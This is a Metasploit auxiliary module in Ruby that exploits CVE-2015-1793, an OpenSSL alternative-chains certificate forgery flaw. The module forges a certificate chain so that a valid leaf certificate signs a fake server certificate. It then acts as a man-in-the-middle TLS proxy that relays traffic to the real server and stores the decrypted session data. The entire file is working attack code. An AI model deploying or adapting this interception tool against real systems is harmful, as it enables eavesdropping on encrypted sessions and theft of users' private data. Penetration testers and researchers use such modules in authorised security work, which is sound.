##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'OpenSSL Alternative Chains Certificate Forgery MITM Proxy',
      'Description'    => %q{
        This module exploits a logic error in OpenSSL by impersonating the server
        and sending a specially-crafted chain of certificates, resulting in
        certain checks on untrusted certificates to be bypassed on the client,
        allowing it to use a valid leaf certificate as a CA certificate to sign a
        fake certificate. The SSL/TLS session is then proxied to the server
        allowing the session to continue normally and application data transmitted
        between the peers to be saved.

        The valid leaf certificate must not contain the keyUsage extension or it
        must have at least the keyCertSign bit set (see X509_check_issued function
        in crypto/x509v3/v3_purp.c); otherwise; X509_verify_cert fails with
        X509_V_ERR_UNABLE_TO_GET_ISSUER_CERT_LOCALLY. This module requires an
        active man-in-the-middle attack.
      },
      'Author'      =>
        [
          'David Benjamin', # Vulnerability discovery
          'Adam Langley', # Vulnerability discovery
          'Ramon de C Valle' # Metasploit module
        ],
      'License' => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service',
      'References' => [
        ['CVE', '2015-1793'],
        ['CWE', '754'],
        ['URL', 'http://git.openssl.org/?p=openssl.git;a=commit;h=f404943bcab4898d18f3ac1b36479d1d7bbbb9e6']
      ],
      'DisclosureDate' => 'Jul 9 2015'
    )

    register_options(
      [
        OptString.new('CACERT', [ true, "The leaf certificate's CA certificate", nil]),
        OptString.new('CERT', [ true, 'The leaf certificate', nil]),
        OptString.new('KEY', [ true, "The leaf certificate's private key", nil]),
        OptString.new('PASSPHRASE', [ false, "The pass phrase for the leaf certificate's private key", nil]),
        OptString.new('SUBJECT', [ false, 'The subject field for the fake certificate', '/C=US/ST=California/L=Mountain View/O=Example Inc/CN=*.example.com']),
        OptString.new('HOST', [ true, 'The server address', nil]),
        OptString.new('PORT', [ true, 'The server port', 443]),
        OptString.new('SRVHOST', [ true, 'The proxy address', '0.0.0.0']),
        OptString.new('SRVPORT', [ true, 'The proxy port', 443])
      ])
  end

  def cleanup
    super
    return unless @proxy

    begin
      @proxy.deref if @proxy.kind_of?(Rex::Service)
      if @proxy.kind_of?(Rex::Socket)
        @proxy.close
        @proxy.stop
      end
      @proxy = nil
    rescue ::Exception
    end
  end

  def run
    host = datastore['HOST']
    port = datastore['PORT']
    local_host = datastore['SRVHOST']
    local_port = datastore['SRVPORT']

    root_ca_name = OpenSSL::X509::Name.parse('/C=US/O=Root Inc./CN=Root CA')
    root_ca_key = OpenSSL::PKey::RSA.new(2048)
    root_ca_cert = OpenSSL::X509::Certificate.new
    root_ca_cert.issuer = OpenSSL::X509::Name.parse('/C=US/O=Root Inc./CN=Root CA')
    root_ca_cert.not_after = Time.now + 86400
    root_ca_cert.not_before = Time.now
    root_ca_cert.public_key = root_ca_key.public_key
    root_ca_cert.serial = 0
    root_ca_cert.subject = root_ca_name
    root_ca_cert.version = 2
    extension_factory = OpenSSL::X509::ExtensionFactory.new(root_ca_cert, root_ca_cert)
    root_ca_cert.add_extension(extension_factory.create_extension('basicConstraints', 'CA:TRUE', true))
    root_ca_cert.add_extension(extension_factory.create_extension('keyUsage', 'keyCertSign,cRLSign', true))
    root_ca_cert.add_extension(extension_factory.create_extension('subjectKeyIdentifier', 'hash'))
    root_ca_cert.sign(root_ca_key, OpenSSL::Digest::SHA1.new)

    inter_ca_name = OpenSSL::X509::Name.parse('/C=US/O=Intermediate Inc./CN=Intermediate CA')
    inter_ca_key = OpenSSL::PKey::RSA.new(2048)
    inter_ca_cert = OpenSSL::X509::Certificate.new
    inter_ca_cert.issuer = root_ca_name
    inter_ca_cert.not_after = Time.now + 86400
    inter_ca_cert.not_before = Time.now
    inter_ca_cert.public_key = inter_ca_key.public_key
    inter_ca_cert.serial = 0
    inter_ca_cert.subject = inter_ca_name
    inter_ca_cert.version = 2
    extension_factory = OpenSSL::X509::ExtensionFactory.new(root_ca_cert, inter_ca_cert)
    inter_ca_cert.add_extension(extension_factory.create_extension('basicConstraints', 'CA:TRUE', true))
    inter_ca_cert.add_extension(extension_factory.create_extension('keyUsage', 'keyCertSign,cRLSign', true))
    inter_ca_cert.add_extension(extension_factory.create_extension('subjectKeyIdentifier', 'hash'))
    inter_ca_cert.sign(root_ca_key, OpenSSL::Digest::SHA1.new)

    subinter_ca_cert = OpenSSL::X509::Certificate.new(File.read(datastore['CACERT']))
    subinter_ca_cert.issuer = inter_ca_name
    subinter_ca_cert.sign(inter_ca_key, OpenSSL::Digest::SHA1.new)
    leaf_key = OpenSSL::PKey::RSA.new(File.read(datastore['KEY']), datastore['PASSPHRASE'])
    leaf_cert = OpenSSL::X509::Certificate.new(File.read(datastore['CERT']))

    fake_name = OpenSSL::X509::Name.parse(datastore['SUBJECT'])
    fake_key = OpenSSL::PKey::RSA.new(2048)
    fake_cert = OpenSSL::X509::Certificate.new
    fake_cert.issuer = leaf_cert.subject
    fake_cert.not_after = Time.now + 3600
    fake_cert.not_before = Time.now
    fake_cert.public_key = fake_key.public_key
    fake_cert.serial = 0
    fake_cert.subject = fake_name
    fake_cert.version = 2
    extension_factory = OpenSSL::X509::ExtensionFactory.new(leaf_cert, fake_cert)
    fake_cert.add_extension(extension_factory.create_extension('basicConstraints', 'CA:FALSE', true))
    fake_cert.add_extension(extension_factory.create_extension('keyUsage', 'digitalSignature,nonRepudiation,keyEncipherment'))
    fake_cert.add_extension(extension_factory.create_extension('subjectKeyIdentifier', 'hash'))
    fake_cert.sign(leaf_key, OpenSSL::Digest::SHA1.new)

    context = OpenSSL::SSL::SSLContext.new
    context.cert = fake_cert
    context.extra_chain_cert = [leaf_cert, subinter_ca_cert]
    context.key = fake_key

    @proxy = Rex::Socket::SslTcpServer.create(
      'LocalHost' => local_host,
      'LocalPort' => local_port,
      'SSLContext' => context,
      'Context'   =>
        {
          'Msf'        => framework,
          'MsfExploit' => self
        })

    print_status('Listening on %s:%d' % [local_host, local_port])

    thread_num = 0

    loop do
      framework.threads.spawn("Thread #{thread_num += 1}", false, @proxy.accept) do |client|
        add_socket(client)
        application_data = ''
        print_status('Accepted connection from %s:%d' % [client.peerhost, client.peerport])

        server = Rex::Socket::Tcp.create(
          'PeerHost' => host,
          'PeerPort' => port,
          'SSL'      => true,
          'SSLVerifyMode' => 'NONE',
          'Context'  =>
            {
              'Msf'        => framework,
              'MsfExploit' => self
            })
        add_socket(server)

        print_status('Connected to %s:%d' % [host, port])

        begin
          loop do
            readable, _, _ = Rex::ThreadSafe.select([client, server])

            readable.each do |r|
              data = r.get_once
              print_status('%d bytes received' % [data.bytesize])

              application_data << data

              case r
              when client
                count = server.put(data)
                print_status('%d bytes sent' % [count])
              when server
                count = client.put(data)
                print_status('%d bytes sent' % [count])
              end
            end
          end

        rescue EOFError, Errno::ECONNRESET
          path = store_loot(
            'tls.application_data',
            'application/octet-stream',
            client.peerhost,
            application_data,
            'application_data',
            'TLS session application data'
          )

          print_good("SSL/TLS session application data successfully stored in #{path}")

          client.close
          server.close

          next
        end

        client.close
        server.close
      end
    end
  end
end
